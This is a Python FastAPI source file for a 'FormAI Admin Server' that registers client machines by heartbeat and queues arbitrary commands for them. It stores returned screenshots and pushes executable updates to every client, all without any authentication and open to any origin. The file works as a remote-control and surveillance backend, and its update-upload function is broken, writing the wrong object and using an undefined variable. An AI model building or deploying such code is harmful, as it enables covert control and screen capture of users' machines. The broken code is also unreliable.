#!/usr/bin/env python3
"""
FormAI Admin Server - Monitors active installations
Run this on your admin/monitoring machine
"""
import os
import sys
import json
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List
import uuid

from fastapi import FastAPI, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
from colorama import init, Fore, Style

# Initialize colorama
init()

# Admin server configuration
ADMIN_PORT = 5512
DATA_DIR = Path("admin_data")
SCREENSHOTS_DIR = DATA_DIR / "screenshots"
UPDATES_DIR = DATA_DIR / "updates"
CLIENTS_FILE = DATA_DIR / "clients.json"
COMMANDS_FILE = DATA_DIR / "commands.json"
COMMAND_RESULTS_FILE = DATA_DIR / "command_results.json"
OFFLINE_THRESHOLD = 600  # 10 minutes

# Ensure data directories exist
DATA_DIR.mkdir(exist_ok=True)
SCREENSHOTS_DIR.mkdir(exist_ok=True)
UPDATES_DIR.mkdir(exist_ok=True)

# Initialize FastAPI
app = FastAPI(title="FormAI Admin Server", version="1.0.0")

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Pydantic models
class HeartbeatData(BaseModel):
    hostname: str
    local_ip: str
    platform: str = "unknown"
    platform_version: str = "unknown"
    platform_release: str = "unknown"
    machine: str = "unknown"
    processor: str = "unknown"
    python_version: str = "unknown"
    timestamp: str
    version: str = "1.0.0"
    client_id: str = None


class ClientInfo(BaseModel):
    client_id: str
    hostname: str
    local_ip: str
    platform: str
    platform_version: str
    platform_release: str
    machine: str
    processor: str
    python_version: str
    version: str
    first_seen: str
    last_seen: str
    heartbeat_count: int


# In-memory storage (loaded from disk)
clients: Dict[str, dict] = {}
pending_commands: Dict[str, List[dict]] = {}  # client_id -> list of commands
command_results: Dict[str, dict] = {}  # command_id -> result


def load_clients():
    """Load clients from disk"""
    global clients
    if CLIENTS_FILE.exists():
        try:
            with open(CLIENTS_FILE, 'r') as f:
                clients = json.load(f)
            print(f"{Fore.GREEN}✓ Loaded {len(clients)} clients from disk{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}⚠ Failed to load clients: {e}{Style.RESET_ALL}")
            clients = {}
    else:
        clients = {}


def save_clients():
    """Save clients to disk"""
    try:
        with open(CLIENTS_FILE, 'w') as f:
            json.dump(clients, f, indent=2)
    except Exception as e:
        print(f"{Fore.RED}✗ Failed to save clients: {e}{Style.RESET_ALL}")


def load_commands():
    """Load pending commands from disk"""
    global pending_commands
    if COMMANDS_FILE.exists():
        try:
            with open(COMMANDS_FILE, 'r') as f:
                pending_commands = json.load(f)
        except Exception as e:
            print(f"{Fore.YELLOW}⚠ Failed to load commands: {e}{Style.RESET_ALL}")
            pending_commands = {}
    else:
        pending_commands = {}


def save_commands():
    """Save pending commands to disk"""
    try:
        with open(COMMANDS_FILE, 'w') as f:
            json.dump(pending_commands, f, indent=2)
    except Exception as e:
        print(f"{Fore.RED}✗ Failed to save commands: {e}{Style.RESET_ALL}")


def load_command_results():
    """Load command results from disk"""
    global command_results
    if COMMAND_RESULTS_FILE.exists():
        try:
            with open(COMMAND_RESULTS_FILE, 'r') as f:
                command_results = json.load(f)
        except Exception as e:
            print(f"{Fore.YELLOW}⚠ Failed to load command results: {e}{Style.RESET_ALL}")
            command_results = {}
    else:
        command_results = {}


def save_command_results():
    """Save command results to disk"""
    try:
        with open(COMMAND_RESULTS_FILE, 'w') as f:
            json.dump(command_results, f, indent=2)
    except Exception as e:
        print(f"{Fore.RED}✗ Failed to save command results: {e}{Style.RESET_ALL}")


@app.on_event("startup")
async def startup_event():
    """Load data on startup"""
    load_clients()
    load_commands()
    load_command_results()
    print(f"\n{Fore.GREEN}======================================================={Style.RESET_ALL}")
    print(f"{Fore.GREEN}  FormAI Admin Server Started{Style.RESET_ALL}")
    print(f"{Fore.GREEN}======================================================={Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Dashboard: http://localhost:{ADMIN_PORT}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  API Endpoint: http://localhost:{ADMIN_PORT}/api/heartbeat{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  Press Ctrl+C to stop{Style.RESET_ALL}\n")


@app.post("/api/heartbeat")
async def receive_heartbeat(data: HeartbeatData):
    """Receive heartbeat from client"""
    global clients

    # Generate client_id if not provided
    if not data.client_id:
        data.client_id = str(uuid.uuid4())

    client_id = data.client_id
    now = datetime.utcnow().isoformat()

    # Update or create client record
    if client_id in clients:
        clients[client_id]["last_seen"] = now
        clients[client_id]["heartbeat_count"] += 1
        clients[client_id]["hostname"] = data.hostname
        clients[client_id]["local_ip"] = data.local_ip
        clients[client_id]["version"] = data.version
    else:
        clients[client_id] = {
            "client_id": client_id,
            "hostname": data.hostname,
            "local_ip": data.local_ip,
            "platform": data.platform,
            "platform_version": data.platform_version,
            "platform_release": data.platform_release,
            "machine": data.machine,
            "processor": data.processor,
            "python_version": data.python_version,
            "version": data.version,
            "first_seen": now,
            "last_seen": now,
            "heartbeat_count": 1
        }
        print(f"{Fore.GREEN}✓ New client registered: {data.hostname} ({data.local_ip}){Style.RESET_ALL}")

    # Save to disk
    save_clients()

    # Get pending commands for this client
    commands = pending_commands.get(client_id, [])

    # Mark commands as delivered (remove from queue)
    if commands:
        pending_commands[client_id] = []
        save_commands()

    return {
        "status": "ok",
        "client_id": client_id,
        "commands": commands
    }


@app.get("/api/clients")
async def get_clients():
    """Get all clients with online status"""
    now = datetime.utcnow()
    threshold = timedelta(seconds=OFFLINE_THRESHOLD)

    result = []
    for client_id, client in clients.items():
        last_seen = datetime.fromisoformat(client["last_seen"])
        is_online = (now - last_seen) < threshold

        result.append({
            **client,
            "is_online": is_online,
            "minutes_since_seen": int((now - last_seen).total_seconds() / 60)
        })

    # Sort by last_seen (most recent first)
    result.sort(key=lambda x: x["last_seen"], reverse=True)

    return {
        "total": len(result),
        "online": sum(1 for c in result if c["is_online"]),
        "offline": sum(1 for c in result if not c["is_online"]),
        "clients": result
    }


@app.get("/api/stats")
async def get_stats():
    """Get statistics"""
    now = datetime.utcnow()
    threshold = timedelta(seconds=OFFLINE_THRESHOLD)

    online = 0
    offline = 0
    total_heartbeats = 0

    for client in clients.values():
        last_seen = datetime.fromisoformat(client["last_seen"])
        if (now - last_seen) < threshold:
            online += 1
        else:
            offline += 1
        total_heartbeats += client["heartbeat_count"]

    return {
        "total_clients": len(clients),
        "online": online,
        "offline": offline,
        "total_heartbeats": total_heartbeats
    }


@app.post("/api/send_command")
async def send_command(request: dict):
    """Send command to a client"""
    client_id = request.get("client_id")
    command = request.get("command")
    params = request.get("params", {})

    if not client_id or not command:
        raise HTTPException(status_code=400, detail="client_id and command are required")

    if client_id not in clients:
        raise HTTPException(status_code=404, detail="Client not found")

    # Generate command ID
    command_id = str(uuid.uuid4())

    # Create command object
    cmd_obj = {
        "command_id": command_id,
        "command": command,
        "params": params,
        "created_at": datetime.utcnow().isoformat(),
        "status": "pending"
    }

    # Add to pending commands queue
    if client_id not in pending_commands:
        pending_commands[client_id] = []

    pending_commands[client_id].append(cmd_obj)
    save_commands()

    print(f"{Fore.CYAN}📤 Command queued for {clients[client_id]['hostname']}: {command}{Style.RESET_ALL}")

    return {
        "status": "ok",
        "command_id": command_id,
        "message": f"Command queued for delivery"
    }


@app.post("/api/command_result")
async def receive_command_result(data: dict):
    """Receive command execution result from client"""
    command_id = data.get("command_id")
    client_id = data.get("client_id")
    result = data.get("result", {})
    timestamp = data.get("timestamp")

    if not command_id or not client_id:
        raise HTTPException(status_code=400, detail="command_id and client_id are required")

    # Handle screenshot results specially
    if result.get("screenshot"):
        try:
            import base64
            screenshot_data = result["screenshot"]
            screenshot_bytes = base64.b64decode(screenshot_data)

            # Save screenshot to disk
            client_name = clients.get(client_id, {}).get("hostname", "unknown")
            timestamp_str = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
            screenshot_filename = f"{client_name}_{timestamp_str}.png"
            screenshot_path = SCREENSHOTS_DIR / screenshot_filename

            with open(screenshot_path, 'wb') as f:
                f.write(screenshot_bytes)

            # Store reference to screenshot instead of base64 data
            result["screenshot_file"] = screenshot_filename
            result["screenshot_path"] = str(screenshot_path)
            del result["screenshot"]  # Remove large base64 data

            print(f"{Fore.GREEN}📸 Screenshot saved from {client_name}: {screenshot_filename}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}✗ Failed to save screenshot: {e}{Style.RESET_ALL}")

    # Store result
    command_results[command_id] = {
        "client_id": client_id,
        "result": result,
        "timestamp": timestamp,
        "received_at": datetime.utcnow().isoformat()
    }

    save_command_results()

    status_emoji = "✓" if result.get("status") == "success" else "✗"
    client_name = clients.get(client_id, {}).get("hostname", "unknown")
    print(f"{Fore.GREEN if result.get('status') == 'success' else Fore.RED}{status_emoji} Command result from {client_name}{Style.RESET_ALL}")

    return {"status": "ok"}


@app.get("/api/command_results")
async def get_command_results():
    """Get all command results"""
    return {
        "total": len(command_results),
        "results": command_results
    }


@app.get("/api/command_results/{command_id}")
async def get_command_result(command_id: str):
    """Get specific command result"""
    if command_id not in command_results:
        raise HTTPException(status_code=404, detail="Command result not found")

    return command_results[command_id]


@app.get("/api/screenshots")
async def get_screenshots():
    """Get list of all screenshots"""
    screenshots = []
    if SCREENSHOTS_DIR.exists():
        for screenshot_file in sorted(SCREENSHOTS_DIR.glob("*.png"), key=lambda x: x.stat().st_mtime, reverse=True):
            screenshots.append({
                "filename": screenshot_file.name,
                "size": screenshot_file.stat().st_size,
                "created_at": datetime.fromtimestamp(screenshot_file.stat().st_mtime).isoformat()
            })
    return {
        "total": len(screenshots),
        "screenshots": screenshots
    }


@app.get("/api/screenshots/{filename}")
async def get_screenshot(filename: str):
    """Get a specific screenshot file"""
    screenshot_path = SCREENSHOTS_DIR / filename
    if not screenshot_path.exists():
        raise HTTPException(status_code=404, detail="Screenshot not found")
    return FileResponse(screenshot_path, media_type="image/png")


# Update Management Endpoints
from fastapi import UploadFile, File, Form

@app.post("/api/updates/upload")
async def upload_update(
    file: UploadFile = File(...),
    version: str = Form(...)
):
    """Upload a new FormAI.exe update"""
    import hashlib

    try:
        # Read file content
        file_content = await file.read()

        # Calculate SHA256 hash
        sha256_hash = hashlib.sha256(file_content).hexdigest()
        file_size = len(file_content)

        # Save update file
        update_filename = f"FormAI_{version}.exe"
        update_path = UPDATES_DIR / update_filename

        with open(update_path, 'wb') as f:
            f.write(file)

        # Save metadata
        metadata = {
            "version": version,
            "filename": update_filename,
            "original_filename": filename,
            "size": file_size,
            "sha256": sha256_hash,
            "uploaded_at": datetime.now().isoformat()
        }

        metadata_path = UPDATES_DIR / f"FormAI_{version}.json"
        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)

        print(f"{Fore.GREEN}✓ Uploaded update v{version} ({file_size} bytes, hash: {sha256_hash[:16]}...){Style.RESET_ALL}")

        return {
            "success": True,
            "message": f"Update v{version} uploaded successfully",
            "metadata": metadata
        }

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/updates/list")
async def list_updates():
    """List all available updates"""
    updates = []

    if UPDATES_DIR.exists():
        for metadata_file in sorted(UPDATES_DIR.glob("FormAI_*.json"), key=lambda x: x.stat().st_mtime, reverse=True):
            try:
                with open(metadata_file, 'r') as f:
                    metadata = json.load(f)
                updates.append(metadata)
            except:
                continue

    return {
        "total": len(updates),
        "updates": updates
    }


@app.get("/api/updates/download/{version}")
async def download_update(version: str):
    """Serve update file for download by clients"""
    update_filename = f"FormAI_{version}.exe"
    update_path = UPDATES_DIR / update_filename

    if not update_path.exists():
        raise HTTPException(status_code=404, detail=f"Update v{version} not found")

    return FileResponse(
        update_path,
        media_type="application/octet-stream",
        filename=update_filename,
        headers={
            "Content-Disposition": f'attachment; filename="{update_filename}"'
        }
    )


@app.post("/api/updates/deploy")
async def deploy_update(version: str, client_ids: List[str] = None):
    """Send update command to selected clients (or all if none specified)"""
    import hashlib

    # Get update metadata
    metadata_path = UPDATES_DIR / f"FormAI_{version}.json"
    if not metadata_path.exists():
        raise HTTPException(status_code=404, detail=f"Update v{version} not found")

    with open(metadata_path, 'r') as f:
        metadata = json.load(f)

    # Determine target clients
    target_clients = client_ids if client_ids else list(clients.keys())

    if not target_clients:
        raise HTTPException(status_code=400, detail="No clients available")

    # Create update command for each client
    deployed_count = 0
    for client_id in target_clients:
        if client_id not in clients:
            continue

        command = {
            "command_id": str(uuid.uuid4()),
            "command": "update_formai",
            "params": {
                "version": version,
                "sha256": metadata["sha256"],
                "size": metadata["size"]
            },
            "created_at": datetime.now().isoformat(),
            "status": "pending"
        }

        if client_id not in pending_commands:
            pending_commands[client_id] = []

        pending_commands[client_id].append(command)
        deployed_count += 1

    # Save pending commands
    save_commands()

    print(f"{Fore.GREEN}✓ Deployed update v{version} to {deployed_count} client(s){Style.RESET_ALL}")

    return {
        "success": True,
        "message": f"Update v{version} deployed to {deployed_count} client(s)",
        "version": version,
        "deployed_to": deployed_count,
        "total_clients": len(clients)
    }


@app.delete("/api/updates/{version}")
async def delete_update(version: str):
    """Delete an update and its metadata"""
    update_filename = f"FormAI_{version}.exe"
    metadata_filename = f"FormAI_{version}.json"

    update_path = UPDATES_DIR / update_filename
    metadata_path = UPDATES_DIR / metadata_filename

    deleted = []

    if update_path.exists():
        update_path.unlink()
        deleted.append(update_filename)

    if metadata_path.exists():
        metadata_path.unlink()
        deleted.append(metadata_filename)

    if not deleted:
        raise HTTPException(status_code=404, detail=f"Update v{version} not found")

    return {
        "success": True,
        "message": f"Deleted update v{version}",
        "deleted_files": deleted
    }


@app.get("/")
async def serve_admin_dashboard():
    """Serve admin dashboard"""
    # Check if admin.html exists
    admin_html = Path("web/admin.html")
    if admin_html.exists():
        return FileResponse(admin_html)
    else:
        return JSONResponse({
            "message": "Admin dashboard UI not found",
            "api_endpoint": "/api/clients",
            "stats_endpoint": "/api/stats"
        })


if __name__ == "__main__":
    print(f"\n{Fore.CYAN}========================================================{Style.RESET_ALL}")
    print(f"{Fore.CYAN}         FormAI Admin Monitoring Server            {Style.RESET_ALL}")
    print(f"{Fore.CYAN}========================================================{Style.RESET_ALL}\n")
    print(f"{Fore.GREEN}Admin Dashboard: http://localhost:{ADMIN_PORT}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}API Endpoints: /api/clients, /api/stats, /api/updates{Style.RESET_ALL}\n")

    uvicorn.run(
        app,
        host="0.0.0.0",
        port=ADMIN_PORT,
        log_level="info"
    )
